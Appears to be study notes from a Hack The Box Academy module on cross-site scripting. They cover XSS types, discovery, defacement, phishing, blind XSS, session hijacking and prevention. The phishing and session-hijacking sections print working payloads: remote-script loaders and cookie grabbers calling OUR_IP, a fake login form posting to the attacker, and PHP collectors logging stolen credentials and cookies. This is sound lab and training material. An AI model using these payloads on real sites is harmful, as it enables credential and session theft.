# Cross-Site Scripting (XSS)

XSS = unsanitized user input lets an attacker "write" JavaScript into the page, executing client-side in other users' browsers. No direct back-end impact and limited to the browser's JS engine + same domain — but low impact × high prevalence = medium risk, and the attack surface inside the browser is wide: session cookie theft, forced API actions (password changes), defacement, crypto mining, ads. Chained with a browser binary exploit, it breaks out of the sandbox onto the machine. History worth remembering: Samy Worm (2005, stored XSS on MySpace, 1M+ infections in a day via self-reposting "Samy is my hero"), TweetDeck self-retweeting tweet (2014, 38k retweets in two minutes, forced a shutdown), Google search-bar XSS as late as 2019, Apache server XSS actively stealing passwords.

Three types:

- **Stored (Persistent)** — input saved to the back-end DB and executed on retrieval (posts/comments). Most critical: hits every visitor, survives refreshes, removal requires purging the DB.
- **Reflected (Non-Persistent)** — input processed by the back-end and echoed back unfiltered (error/confirmation messages). Temporary; targets whoever you send the crafted URL to.
- **DOM-based** — input never reaches the back-end; JavaScript processes it client-side and writes it into the page (URL hash params). Least scope, but same attacker URL-delivery model.

## Stored XSS

Payload stored server-side → alert on every visit by anyone. Test payload:

```html
<script>alert(window.origin)</script>
```

`window.origin` (not a static `1`) because modern apps run forms in cross-domain IFrames — the alert reveals which origin actually executed the code. Alternatives when `alert()` is blocked: `<plaintext>` (stops HTML rendering, dumps the rest as text) and `<script>print()</script>` (print dialog — never blocked). Confirm persistence by refreshing; confirm injection with CTRL+U (payload visible in page source).

## Reflected XSS

Input goes to the back-end and comes back inside a response (e.g. `Task 'test' could not be added.`). Same test payload; the script tags render empty in the echoed text but execute. Not persistent — leaving the page kills it.

Delivery: check DevTools (CTRL+SHIFT+I → Network) for the request method. GET means the payload rides the URL — send the victim:

```text
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```

Copy the URL from the address bar or right-click the request → Copy → Copy URL.

## DOM XSS

No HTTP request fires on input (Network tab stays empty); the parameter lives after a `#` in the URL — pure client-side processing. The payload never appears in the base page source (CTRL+U) because JS modifies the page after load; inspect the live DOM with CTRL+SHIFT+C instead.

**Source & Sink:** Source = the JavaScript object taking user input (URL param, input field). Sink = the function writing it into the DOM. Unsantizing sinks:

- `document.write()`, `DOM.innerHTML`, `DOM.outerHTML`
- jQuery: `add()`, `after()`, `append()`

Module example (script.js): Source reads `task=` from `document.URL`; sink is `document.getElementById("todo").innerHTML = ... decodeURIComponent(task)` — controllable input, no sanitization, vulnerable.

`innerHTML` won't execute `<script>` tags (security feature), so switch vectors:

```html
<img src="" onerror=alert(window.origin)>
```

Empty src guarantees the error fires. Delivered as `#task=<img src='' onerror=alert(window.origin)>`.

## XSS Discovery

- **Scanners** — Nessus/Burp Pro/ZAP do passive (client-side DOM review) and active (payload injection) scanning. Paid tools are more accurate once bypasses are needed.
- **Open-source tools** — XSStrike, Brute XSS, XSSer. XSStrike pattern: find input fields, fire payloads, compare rendered source for reflections. Always manually verify — a reflected payload isn't always an executed one.

```bash
git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
# WAF status, reflections found, generated payloads with efficiency/confidence scores
```

- **Manual payload lists** — PayloadsAllTheThings, PayloadBox. Most entries target specific injection points (post-quote, post-attribute) or evasions — expect most to fail on any given app. XSS isn't limited to form fields: any displayed input counts, including Cookie and User-Agent headers.
- **Code review** — the reliable method (front- and back-end): trace input handling end to end, write a payload that fits exactly. The only realistic way into mature apps whose devs already ran scanners.

## Defacing

Classic stored-XSS attack — change what every visitor sees (NHS 2018 example; real media/share-price fallout). Four levers:

```javascript
document.body.style.background = "#141d2b"          // background color
document.body.background = "https://.../logo.svg"   // background image
document.title = 'HackTheBox Academy'               // tab title
document.getElementsByTagName('body')[0].innerHTML = '...'   // replace entire page body
// jQuery equivalents, when the page loads jQuery:
$("#todo").html('New Text');
```

Defacement payload = the replacement HTML minified to one line inside innerHTML. Original source stays underneath — the injected scripts (appended at the end of the source) rewrite the render. Middle-of-page injections need accounting for whatever loads after them. Draft and test the HTML locally before committing it.

## Phishing

Inject a fake login form that ships credentials to the attacker's listener.

Discovery first: find a working payload for the vulnerable app (module's image viewer at `/phishing` rejects `<script>` — inspect how input lands in the source to pick the right vector).

Injected form (minified, written via `document.write()`), `OUR_IP` = tun0:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Cleanup for credibility:

```javascript
document.getElementById('urlform').remove();   // strip the real input form (find the id via CTRL+SHIFT+C picker)
```

Append `<!--` after the payload to comment out the leftover original HTML. The page now looks like it legitimately requires login.

Catch credentials — netcat shows them raw but returns an error page:

```bash
sudo nc -lvnp 80
# GET /?username=test&password=test&submit=Login HTTP/1.1
```

PHP collector logs and redirects the victim back to the clean original page (they think the login worked):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver   # index.php lives here
sudo php -S 0.0.0.0:80
```

## Session Hijacking

**Blind XSS** — the payload fires on a page you can't see (admin panels behind contact forms, reviews, user details, support tickets, the User-Agent header). Detection trick: inject a remote-script loader whose path names the field — whichever field's name arrives at your listener is the vulnerable one:

```html
<script src=http://OUR_IP/username></script>
```

Remote-script payload set (from PayloadsAllTheThings) to rotate through:

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Smart field triage: email validated both ends → skip; password hashed → skip. Blind XSS pairs best with DOM-type sinks since the source is reviewable.

Cookie-grabber script (served as script.js; the Image variant is quieter than a location redirect):

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Collector splits multi-cookie strings and logs victim IP per line:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Server sees two hits — `/script.js`, then `/index.php?c=...`. Use the cookie: Firefox DevTools → Storage (SHIFT+F9) → + → Name/Value from the stolen pair → refresh → logged in as the victim.

## XSS Prevention

Secure the Source and the Sink on both ends.

**Front-end:** validate input (regex, e.g. the email format check); sanitize with DOMPurify (`let clean = DOMPurify.sanitize(dirty)` — escapes specials); never place raw user input inside `<script>`, `<style>`, tag/attribute fields, or HTML comments; avoid the raw-writing functions — `DOM.innerHTML`, `DOM.outerHTML`, `document.write()`, `document.writeln`, `document.domain`, and jQuery `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()`.

**Back-end:** front-end checks bypass trivially with custom requests, so validate again server-side (`filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)`); sanitize (`addslashes()` in PHP; DOMPurify in Node); **output-encode** anything displayed — `htmlspecialchars`/`htmlentities` (PHP, `<` → `&lt;`), `html-entities` (Node).

**Server config:** HTTPS everywhere; XSS-prevention headers; correct Content-Type with `X-Content-Type-Options=nosniff`; `Content-Security-Policy: script-src 'self'` (locally hosted scripts only); `HttpOnly` + `Secure` cookie flags so JavaScript can't read cookies and transport is HTTPS-only. WAF on top; some frameworks (ASP.NET) ship built-in XSS protection. Even with all of it — keep testing; gaps survive secure coding and configuration.